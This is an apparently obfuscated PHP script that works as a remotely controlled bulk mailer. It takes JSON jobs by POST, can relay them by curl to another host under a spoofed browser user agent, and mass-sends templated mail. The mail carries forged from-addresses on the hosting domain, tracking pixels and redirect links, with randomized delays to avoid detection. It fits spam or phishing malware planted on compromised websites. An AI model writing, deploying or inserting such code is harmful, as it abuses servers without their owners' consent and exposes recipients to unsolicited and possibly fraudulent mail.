<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); @error_reporting(0); @ini_set('display_errors', 0); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($spe50690) { if ($spe50690 == 'keys') { return array_keys($this->_keys); } } public function Import($spe50690, $sp424574) { if (is_array($sp424574)) { $this->values[$spe50690] = array(); foreach ($sp424574 as $sp33d193) { if (!empty($sp33d193['key'])) { $this->values[$spe50690][$sp33d193['key']] = $sp33d193['value']; } else { $this->values[$spe50690][] = $sp33d193['value']; } } } else { $this->Assign($spe50690, $sp424574); } } public function Assign($spe50690, $sp821603) { $this->values[$spe50690] = $sp821603; } public function Parse($sp353531) { $sp1aaa9f = ''; $spd38615 = 0; while (true) { $spadc4fe = strpos($sp353531, '{', $spd38615); if ($spadc4fe === false) { $sp1aaa9f .= substr($sp353531, $spd38615); break; } $sp1aaa9f .= substr($sp353531, $spd38615, $spadc4fe - $spd38615); $spd38615 = $spadc4fe + 1; $sp0669fb = ''; $spd3bd7e = '{'; $speff6a4 = array(); $sp5ae18b = false; $sp19bb99 = false; $spa5d5ed = 'var'; while ($spd38615 < strlen($sp353531)) { $sp77db2a = substr($sp353531, $spd38615, 1); $spd3bd7e .= $sp77db2a; if ($sp77db2a == ',' || $sp77db2a == '>' || $sp77db2a == '|') { if ($spa5d5ed == 'alias') { $sp5ae18b = $sp0669fb; } elseif ($spa5d5ed == 'mod') { $sp19bb99 = $sp0669fb; } else { $speff6a4[] = $sp0669fb; } $sp0669fb = ''; if ($sp77db2a == '>') { $spa5d5ed = 'alias'; } if ($sp77db2a == '|') { $spa5d5ed = 'mod'; } $spd38615++; continue; } if ($sp77db2a == '}') { if ($spa5d5ed == 'alias') { $sp5ae18b = $sp0669fb; } elseif ($spa5d5ed == 'mod') { $sp19bb99 = $sp0669fb; } else { $speff6a4[] = $sp0669fb; } $spd38615++; break; } $sp0669fb .= $sp77db2a; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $sp77db2a) == 0) { $spd38615++; $speff6a4 = array(); break; } $spd38615++; } if (sizeof($speff6a4) == 0) { $sp1aaa9f .= $spd3bd7e; continue; } $sp43d53a = false; $sp1ec954 = false; if (preg_match('/^\\^/', $speff6a4[0]) > 0) { $speff6a4[0] = substr($speff6a4[0], 1); $sp43d53a = true; } if (preg_match('/^\\!/', $speff6a4[0]) > 0) { $speff6a4[0] = substr($speff6a4[0], 1); $sp1ec954 = true; } $sp02c7f2 = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $speff6a4[0], $sp73742b) > 0) { $sp02c7f2 = $sp73742b[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $speff6a4[0], $sp73742b) > 0) { $sp02c7f2 = explode('-', $sp73742b[1]); } if ($sp02c7f2 !== false) { $speff6a4[0] = substr($speff6a4[0], 0, strpos($speff6a4[0], '[')); } $this->_keys[$speff6a4[0]] = true; if (empty($this->values[$speff6a4[0]]) && empty($this->fixed[$speff6a4[0]])) { continue; } if ($sp43d53a) { unset($this->fixed[$speff6a4[0]]); } if (isset($this->fixed[$speff6a4[0]])) { $sp7f8c41 = $this->fixed[$speff6a4[0]]; } else { $sp7f8c41 = ''; $sp195e90 = 1; if (sizeof($speff6a4) == 2) { $sp195e90 = $speff6a4[1]; } if (sizeof($speff6a4) == 3) { $sp195e90 = rand($speff6a4[1], $speff6a4[2]); } for ($sp7b5128 = 0; $sp7b5128 < $sp195e90; $sp7b5128++) { if (is_array($this->values[$speff6a4[0]])) { if (!is_array($this->used[$speff6a4[0]])) { $this->used[$speff6a4[0]] = array(); } if (count($this->used[$speff6a4[0]]) == count($this->values[$speff6a4[0]])) { $this->used[$speff6a4[0]] = array(); } if ($sp02c7f2 !== false && is_scalar($sp02c7f2)) { $sp7f8c41 .= $this->values[$speff6a4[0]][$sp02c7f2]; $this->used[$sp02c7f2] = true; } else { $sp6f0f95 = array(); if (is_array($sp02c7f2)) { $sp1ebdb0 = $sp02c7f2[0]; $spedab14 = $sp02c7f2[1]; } else { $sp1ebdb0 = 0; $spedab14 = count($this->values[$speff6a4[0]]) - 1; } for ($spc97bce = $sp1ebdb0; $spc97bce <= $spedab14; $spc97bce++) { if ($sp1ec954 && !empty($this->used[$speff6a4[0]][$spc97bce])) { continue; } $sp6f0f95[] = $spc97bce; } $spdfe89b = $sp6f0f95[rand(0, count($sp6f0f95) - 1)]; $this->used[$speff6a4[0]][$spdfe89b] = true; $sp7f8c41 .= $this->values[$speff6a4[0]][$spdfe89b]; } } else { $sp7f8c41 .= $this->values[$speff6a4[0]]; } } } $sp7f8c41 = $this->Parse($sp7f8c41); if ($sp19bb99 !== false) { for ($sp9fac8d = 0; $sp9fac8d < strlen($sp19bb99); $sp9fac8d++) { switch (substr($sp19bb99, $sp9fac8d, 1)) { case 'b': $sp7f8c41 = base64_encode($sp7f8c41); break; case 'q': $sp7f8c41 = quoted_printable_encode($sp7f8c41); break; default: break; } } } if ($sp43d53a) { $this->fixed[$speff6a4[0]] = $sp7f8c41; } if ($sp5ae18b !== false && $sp5ae18b != '') { $this->fixed[$sp5ae18b] = $sp7f8c41; } $sp1aaa9f .= $sp7f8c41; } return $sp1aaa9f; } } $sp8d6787 = file_get_contents('php://input'); $sp39ac06 = json_decode($sp8d6787, true); if (empty($sp39ac06['via_proxy'])) { $sp39ac06['via_proxy'] = true; $sp4f172c = curl_init($sp39ac06['prefix'] . $sp39ac06['files']['s']); $sp0974a7 = json_encode($sp39ac06); curl_setopt($sp4f172c, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp4f172c, CURLOPT_TIMEOUT, 600); curl_setopt($sp4f172c, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp4f172c, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp4f172c, CURLOPT_REFERER, $spc6208f); curl_setopt($sp4f172c, CURLOPT_POST, true); curl_setopt($sp4f172c, CURLOPT_POSTFIELDS, $sp0974a7); curl_setopt($sp4f172c, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($sp0974a7))); $spa3eae5 = curl_exec($sp4f172c); echo $spa3eae5; die; } $sp62de28 = $_SERVER['SERVER_ADDR']; $spa89e6d = $_SERVER['HTTP_HOST']; $spa89e6d = preg_replace('/^www\\./', '', $spa89e6d); $sp1d05b9 = new Macros(); $sp1d05b9->Assign('server_addr', $sp62de28); $sp1d05b9->Assign('server_host', $spa89e6d); foreach ($sp39ac06['macros'] as $spe50690 => $sp424574) { $sp1d05b9->Import($spe50690, $sp424574); } $sp4a4ff4 = preg_replace('/^www\\./i', '', $spa89e6d); $sp3c1bef = $sp1d05b9->Parse('{from_user}@' . $sp4a4ff4); $sp1d05b9->Assign('from_email', $sp3c1bef); $sp1d05b9->Assign('prefix', $sp39ac06['prefix']); $sp1d05b9->Assign('html', $sp39ac06['letter']['html']); $spd38615 = 0; $sp68bd16 = 0; $sp87d487 = 0; $sp624314 = array(); foreach ($sp39ac06['rcpt'] as $sp1ada80) { $sp1d05b9->Assign('email', $sp1ada80['email']); $sp1d05b9->Assign('entry', $sp1ada80); $sp1d05b9->Assign('date', date('r')); $sp1d05b9->Assign('redirect', $sp39ac06['prefix'] . $sp39ac06['files']['r']); $sp1d05b9->Assign('redirect_with_uri', $sp39ac06['prefix'] . $sp39ac06['files']['r'] . '?uri='); $sp1d05b9->Assign('unsubscribe', $sp39ac06['prefix'] . $sp39ac06['files']['u'] . '?id=' . $sp1ada80['id']); $sp1d05b9->Assign('delivery', '<img src="' . $sp39ac06['prefix'] . $sp39ac06['files']['d'] . '?id=' . $sp1ada80['id'] . '" />'); $spd26bfe = $sp1d05b9->Parse($sp39ac06['envelope']['header']); $spdf4ec7 = $sp1d05b9->Parse($sp39ac06['envelope']['body']); if (!empty($sp1ada80['name'])) { $sp3e4c5b = $sp1ada80['name'] . ' <' . $sp1ada80['email'] . '>'; } else { $sp3e4c5b = $sp1ada80['email']; } $spda70c3 = $sp1d05b9->Parse($sp39ac06['letter']['subject']); if ($spd38615 > 0) { sleep(rand(3, 8)); } $spddb7ca = mail($sp3e4c5b, $spda70c3, $spdf4ec7, $spd26bfe); $sp624314[$sp1ada80['id']] = $spddb7ca; if ($spddb7ca) { $sp68bd16++; } else { $sp87d487++; } $spd38615++; } echo serialize(array('total' => count($sp39ac06['rcpt']), 'sent' => $spd38615, 'success' => $sp68bd16, 'error' => $sp87d487, 'rcpt' => $sp624314));